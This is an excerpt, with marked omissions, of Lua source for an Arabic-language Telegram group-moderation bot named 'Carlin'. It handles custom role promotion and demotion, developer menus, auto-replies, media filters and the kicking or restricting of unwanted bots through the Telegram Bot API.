Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n᥀︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevRio:del(Carlin.."Comd:New:rt:Rio:"..ComdNew..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف الصلاحيه", 1, 'html')
end
if DevRio:get(Carlin.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^↫ الغاء ᥀$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, 'html')
DevRio:del(Carlin.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
...
local textn = DevRio:get(Carlin.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevRio:set(Carlin.."Comd:New:rt:Rio:"..textn..msg.chat_id_,text)
...
if DevRio:sismember(Carlin.."Coomds"..msg.chat_id_,DEV_RIO) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrrio = DevRio:get(Carlin.."Comd:New:rt:Rio:"..DEV_RIO..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'TOLENTEam')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(Carlin.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO) 
DevRio:sadd(Carlin..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'TOLENTEam')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(Carlin.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)
DevRio:sadd(Carlin..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'TOLENTEam')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(Carlin.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)  
DevRio:sadd(Carlin..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:srem(Carlin..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(Carlin.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'TOLENTEam')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:srem(Carlin..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(Carlin.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'TOLENTEam')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:srem(Carlin..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(Carlin.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'TOLENTEam')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
end
...
if DevRio:sismember(Carlin.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrrio = DevRio:get(Carlin.."Comd:New:rt:Rio:"..text1[2]..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'TOLENTEam')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(Carlin..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:set(Carlin.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'TOLENTEam')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(Carlin..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:set(Carlin.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'TOLENTEam')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(Carlin..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:set(Carlin.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'TOLENTEam')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevRio:srem(Carlin..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:del(Carlin.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'TOLENTEam')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:srem(Carlin..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:del(Carlin.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'TOLENTEam')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:srem(Carlin..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:del(Carlin.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'TOLENTEam')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevRio:incr(Carlin..'Rio:UsersMsgs'..Carlin..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(Carlin..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(Carlin..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevRio:sismember(Carlin.."Rio:Users",msg.chat_id_) then
DevRio:sadd(Carlin.."Rio:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بتعديل وتغيير كلايش سورس Carlin فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'تغير معلومات الترحيب'},
...
if text == '↫ السورس ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بتحديث  سورس Carlin فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تحديث السورس ᥀','↫ تحديث ᥀'},
{'↫ السيرفر ᥀'},
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب أحصائيات  سورس Carlin فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫  الاحصائيات ᥀'},
{'↫ المشتركين ᥀','↫ المجموعات ᥀'},
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب المطورين لسورس Carlin فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب التفعيل والتعطيل لسورس Carlin فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالاذاعه لسورس Carlin فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ اذاعه بالتثبيت ᥀'},
{'↫ اذاعه خاص ᥀','↫ اذاعه عام ᥀'},
...
if text == '↫ العام ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالعام لسورس Carlin فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بردود الخاص لسورس Carlin فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالاشتراك الاجباري لسورس Carlin فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if text == '↫ المتجر ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بمتجر سورس Carlin فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫  المتجر ᥀'},
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بالاوامر الخدميه الخاصه بسورس Carlin فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر التسليه الخاصه بسورس Carlin فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ غنيلي ᥀','↫ اغنيه ᥀'},
{'↫ ميمز ᥀','↫ ريمكس ᥀'},
{'↫ صوره ᥀','↫ متحركه ᥀'},
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر البوتات الخاصه بسورس Carlin فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر النسب الخاصه بسورس Carlin فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if text == '↫ العاب ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بألعاب سورس Carlin فقط اضغط على اللعبه الذي تريد لعبها'
local key = {
...
if not DevRio:get(Carlin..'Rio:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
local inline = {
{{text="᥀ المطور .",url="t.me/"..(dp.username_ or "TOLENTEam")}},
{{text="᥀ السورس .",url="https://t.me/TOLENTEam"},{text="᥀ لتنصيب بوت .",url="https://t.me/KKKKKKRD"}},{{text="᥀ اضفني في مجموعتك .",url="t.me/"..dp.username_.."?startgroup=botstart"}}
}
local start = DevRio:get(Carlin.."Rio:Start:Bot")
if start then 
Start_Source = start
else
...
DevRio:setex(Carlin..'Rio:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source Carlin     --
if not SecondSudo(msg) and not DevRio:sismember(Carlin..'Rio:Ban:Pv',msg.sender_user_id_) and not DevRio:get(Carlin..'Rio:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_Rio(msg.sender_user_id_, msg.id_, 1, '᥀︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "TOLENTEam")..')', 1, 'md') 
...
DevRio:sadd(Carlin..'Rio:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '᥀︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n᥀︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevRio:srem(Carlin..'Rio:Ban:Pv',data.id_)  
return false  
end 
...
--     Source Carlin     --
if text and DevRio:get(Carlin..'Rio:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevRio:del(Carlin..'Rio:Start:Bots'..msg.sender_user_id_) 
return false
end
DevRio:set(Carlin.."Rio:Start:Bot",text)  
...
DevRio:set(Carlin..'Rio:Start:Bots'..msg.sender_user_id_,true) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin..'Rio:Devinline:Pv',true) 
end
end
--     Source Carlin     --
...
local CarlinTeam = {'- Nothing stops him who wants you .','make them wish they had you !.','Maybe a magical girl','٫ 𝖡𝖾 𝗌𝗂𝗆𝗉𝗅𝖾 𝖺𝗇𝖽 𝖽𝗂𝖿𝖿𝖾𝗋𝖾𝗇𝗍','. 𝖬𝖺𝗄𝖾 𝖽𝗋𝖾𝖺𝗆𝗌 𝖿𝗋𝗈𝗆 𝗒𝗈𝗎𝗋 𝗋𝖾𝖿𝗋𝖺𝖼𝗍𝗂𝗈𝗇𝗌 . .',':Life is lying .','𝖨 𝗐𝗂𝗅𝗅 𝖺𝗅𝗐𝖺𝗒𝗌 𝗅𝗈𝗏𝖾 𝗒𝗈𝗎 𝗇𝖾𝗏𝖾𝗋 𝖿𝗈𝗋𝗀𝖾𝗍'}  
Dev_Rio(msg.chat_id_, msg.id_, 1, ''..CarlinTeam[math.random(#CarlinTeam)]..'' , 1, 'md')  
return false
end
--     Source Carlin     --
if text and (text == 'المطور' or text == 'مطور' or text == '↫  المطور ᥀') and not DevRio:get(Carlin..'Rio:Devinline:Pv'..msg.chat_id_) then
...
local my_ph = DevRio:get(Carlin.."Rio:Photo:Profile"..msg.chat_id_)
if not my_ph then
...
if not DevRio:get(Carlin..'Rio:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
...
{{text = '᥀ Carlin Team .', url="t.me/S3FFF"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
DevRio:incr(Carlin..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:set(Carlin.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevRio:get(Carlin.."Rio:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
...
DevRio:sadd(Carlin..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
...
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(Carlin) then 
DevRio:srem(Carlin.."Rio:Groups", msg.chat_id_) 
...
if DevRio:get(Carlin..'Rio:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevRio:incr(Carlin..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevRio:incr(Carlin..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     Source Carlin     --
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevRio:get(Carlin..'Rio:Lock:FreeBot'..Carlin) then
if ChatType == 'pv' then
...
DevRio:sadd(Carlin..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(Carlin..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevRio:sadd(Carlin..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
...
DevRio:sadd(Carlin.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevRio:sadd(Carlin.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(Carlin.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevRio:srem(Carlin.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevRio:sismember(Carlin..'Rio:Groups',msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevRio:get(Carlin..'Rio:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عدد اعضاء المجموعه اقل من ↫ *'..(DevRio:get(Carlin..'Rio:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
DevRio:sadd(Carlin.."Rio:Groups",msg.chat_id_)
DevRio:sadd(Carlin..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
...
DevRio:set(Carlin.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
...
DevRio:set(Carlin..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source Carlin     --
local ReFalse = tostring(msg.chat_id_)
if not DevRio:sismember(Carlin.."Rio:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
...
if DevRio:get(Carlin..'Rio:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevRio:sadd(Carlin..'Rio:Tkeed:'..msg.chat_id_, dp.id_)
...
if DevRio:get(Carlin.."Rio:Lock:Join"..msg.chat_id_) then
...
if not Manager(msg) then 
local filter = DevRio:smembers(Carlin.."Rio:FilterPhoto"..msg.chat_id_)
...
if not Manager(msg) then 
local filter = DevRio:smembers(Carlin.."Rio:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
...
if not Manager(msg) then 
local filter = DevRio:smembers(Carlin.."Rio:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
...
--     Source Carlin     --
if text and text:match("^(.*)$") then
local DelGpRedRedods = DevRio:get(Carlin..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevRio:get(Carlin..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
DevRio:del(Carlin..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:srem(Carlin..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevRio:get(Carlin..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevRio:del(Carlin..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Carlin..'Rio:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevRio:srem(Carlin..'Rio:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevRio:get(Carlin..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevRio:del(Carlin..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Carlin..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Carlin..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Carlin..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Carlin..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Carlin..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Carlin..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Carlin..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(Carlin..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:srem(Carlin..'Rio:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevRio:get(Carlin.."Rio:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevRio:del(Carlin.."Rio:Add:AllRed"..msg.sender_user_id_)
DevRio:del(Carlin.."Rio:Gif:AllRed"..msg.content_.text_)
DevRio:del(Carlin.."Rio:Voice:AllRed"..msg.content_.text_)
DevRio:del(Carlin.."Rio:Audio:AllRed"..msg.content_.text_)
DevRio:del(Carlin.."Rio:Photo:AllRed"..msg.content_.text_)
DevRio:del(Carlin.."Rio:Stecker:AllRed"..msg.content_.text_)
DevRio:del(Carlin.."Rio:Video:AllRed"..msg.content_.text_)
DevRio:del(Carlin.."Rio:File:AllRed"..msg.content_.text_)
DevRio:del(Carlin.."Rio:Text:AllRed"..msg.content_.text_)
DevRio:del(Carlin.."Rio:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source Carlin     --
if text and text:match("^(.*)$") then
local SaveGpRedod = DevRio:get(Carlin..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevRio:get(Carlin..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevRio:smembers(Carlin..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙᥀︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevRio:del(Carlin..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Carlin..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevRio:del(Carlin..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevRio:srem(Carlin..'Rio:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevRio:sadd(Carlin..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
...
if text and not DevRio:get(Carlin..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevRio:sismember(Carlin..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
local CarlinTeam =  DevRio:smembers(Carlin..'Rio:Text:GpTexts'..text..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '['..CarlinTeam[math.random(#CarlinTeam)]..']' , 1, 'md')  
end
end
--     Source Carlin     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevRio:get(Carlin..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevRio:get(Carlin..'DelManagerRep'..msg.chat_id_)
DevRio:srem(Carlin..'Rio:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevRio:del(Carlin..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Carlin..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(Carlin..'DelManagerRep'..msg.chat_id_)
return false
end
DevRio:del(Carlin..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevRio:get(Carlin..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevRio:set(Carlin..'Rio:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevRio:set(Carlin..'Rio:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevRio:set(Carlin..'Rio:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevRio:set(Carlin..'Rio:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevRio:set(Carlin..'Rio:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
...
DevRio:set(Carlin..'Rio:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevRio:set(Carlin..'Rio:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevRio:set(Carlin..'Rio:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
...
if msg.content_.text_ and not DevRio:get(Carlin..'Rio:Lock:GpRed'..msg.chat_id_) then 
if DevRio:get(Carlin..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Carlin..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(Carlin..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(Carlin..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(Carlin..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Carlin..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(Carlin..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(Carlin..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(Carlin..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
